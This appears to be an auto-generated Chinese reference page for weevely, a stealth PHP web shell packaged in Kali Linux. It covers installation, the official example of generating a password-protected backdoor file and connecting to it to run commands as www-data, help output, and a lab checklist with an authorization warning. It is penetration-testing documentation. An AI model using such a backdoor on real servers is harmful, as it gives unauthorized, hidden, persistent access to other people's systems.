# weevely

> Stealth tiny web shell Weevely is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accoun…

> **功能分类**：Web 应用 ｜ **Kali 包**：`weevely` ｜ **官方文档**：<https://www.kali.org/tools/weevely/>

## 1. 安装

```bash
sudo apt update
sudo apt install weevely
```

| 项目 | 内容 |
|------|------|
| 版本 | 4.0.2 |
| 架构 | all |
| 可执行命令 | `weevely` |
| 依赖 | `python3`、`python3-dateutil`、`python3-mako`、`python3-prettytable`、`python3-socks`、`python3-yaml` |
| 安装体积 | 899 KB |
| 官网 | <https://github.com/epinna/weevely3/> |
| 源码仓库 | <https://salsa.debian.org/pkg-security-team/weevely> |
| 包追踪 | <https://pkg.kali.org/pkg/weevely> |

## 2. 官方用法示例

> 以下为 Kali 官方工具页给出的示例与输出原文。

```text
Usage Example
Generate a PHP backdoor (generate) protected with the given password (s3cr3t).
root@kali:~# weevely generate s3cr3t
[generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'
root@kali:~# weevely http://192.168.1.202/weevely.php s3cr3t
      ________                     __
     |  |  |  |----.----.-.--.----'  |--.--.
     |  |  |  | -__| -__| |  | -__|  |  |  |
     |________|____|____|___/|____|__|___  | v1.1
                                     |_____|
              Stealth tiny web shell

[+] Browse filesystem, execute commands or list available modules with ':help'
[+] Current session: 'sessions/192.168.1.202/weevely.session'

www-data@kali:/var/www $ uname
Linux
www-data@kali:/var/www $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3. 命令与参数（官方 help / man 原文）

本包提供 1 个可执行命令，下面是官方页面内嵌的帮助原文。

### `weevely`

官方给出的调用示例：`weevely generate s3cr3t`

```text
root@kali:~# weevely generate s3cr3t
[generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'
```

### `weevely（示例）`

官方给出的调用示例：`weevely http://192.168.1.202/weevely.php s3cr3t`

```text
root@kali:~# weevely http://192.168.1.202/weevely.php s3cr3t
      ________                     __
     |  |  |  |----.----.-.--.----'  |--.--.
     |  |  |  | -__| -__| |  | -__|  |  |  |
     |________|____|____|___/|____|__|___  | v1.1
                                     |_____|
              Stealth tiny web shell
[+] Browse filesystem, execute commands or list available modules with ':help'
[+] Current session: 'sessions/192.168.1.202/weevely.session'
www-data@kali:/var/www $ uname
Linux
www-data@kali:/var/www $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### `weevely（示例）`

官方给出的调用示例：`weevely -h`

```text
root@kali:~# weevely -h
usage: weevely [-h] {terminal,session,generate} ...
positional arguments:
  {terminal,session,generate}
    terminal            Run terminal or command on the target
    session             Recover an existing session
    generate            Generate new agent
options:
  -h, --help            show this help message and exit
Updated on: 2025-Dec-09
 Edit this page
webshells
wgetpaste
LIGHT
DARK
Links
Home
Download / Get Kali
Blog
OS Documentation
Tool Documentation
System Status
Archived Releases
Partnerships
Platforms
ARM (SBC)
NetHunter (Mobile)
Amazon AWS
Docker
Linode
Microsoft Azure
Microsoft Store (WSL)
Vagrant
Development
Bug Tracker
Continuous Integration
Network Mirror
Package Tracker
GitLab
Community
Discord
Support Forum
PeerTube
Follow Us
Bluesky
Facebook
Instagram
Mastodon
Substack
X
Newsletter
RSS
Policies
Cookie Policy
Privacy Policy
Trademark Policy
© OffSec Services Limited 2026. All rights reserved.
Kali Linux is part of OffSec's Community Projects
Learn more about OffSec's free, open-source penetration testing tools for cybersecurity professionals
```

## 4. 实践清单

按顺序做完这五步，就能把工具从「装上」推进到「会用」：

- [ ] **1.** **装好并确认版本** —— `sudo apt install weevely`，再执行 `weevely --version` 2>/dev/null || `weevely -V`
- [ ] **2.** **读官方帮助** —— `weevely -h`，需要细节时 `man weevely`
- [ ] **3.** **在自有靶场跑最小用例** —— 用 `weevely -h` 里最简单的那个子命令试一次
- [ ] **4.** **对照官方文档确认参数语义** —— <https://www.kali.org/tools/weevely/>，重点核对上一步用到的每个参数
- [ ] **5.** **记录输出并解读** —— 把关键字段抄进笔记，写清「它说明什么」「下一步该做什么」

> ⚠️ 只在**自己的设备**或**获得书面授权**的目标上使用。未授权扫描/入侵在多数司法辖区构成违法。
> 靶场搭建见 [`../../labs/README.md`](../../labs/README.md)。

## 5. 相关

- **精讲教程**（含原理、参数详解、靶场实操与输出解读）：[weevely](../../tools/tutorials/08-后渗透/weevely.md)
- 按攻击阶段浏览同类工具：[`../../tools/by-attack/persistence.md`](../../tools/by-attack/persistence.md)
- 按包速查：[`../catalog/`](../catalog/) ｜ 全量清单：[`../catalog/all-tools.md`](../catalog/all-tools.md)
- Kali 官方工具页：<https://www.kali.org/tools/weevely/>

---

## 来源

- 工具元数据与用法示例、help 原文均抓取自 <https://www.kali.org/tools/weevely/>（同步日期：2026-09-15）
- 抓取与生成脚本：`scripts/fetch_kali_tools.py` · `scripts/fetch_kali_usage.py` · `scripts/gen_kali_reference.py`
